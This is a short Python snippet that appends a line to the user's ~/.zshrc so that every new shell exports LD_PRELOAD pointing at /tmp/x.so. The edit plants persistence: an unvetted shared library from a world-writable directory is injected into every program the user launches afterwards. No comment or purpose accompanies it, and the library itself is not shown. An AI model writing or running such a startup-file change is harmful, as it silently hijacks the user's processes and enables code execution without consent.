import os
with open(os.path.expanduser('~/.zshrc'), 'a') as rc:
    rc.write('export LD_PRELOAD=/tmp/x.so\n')
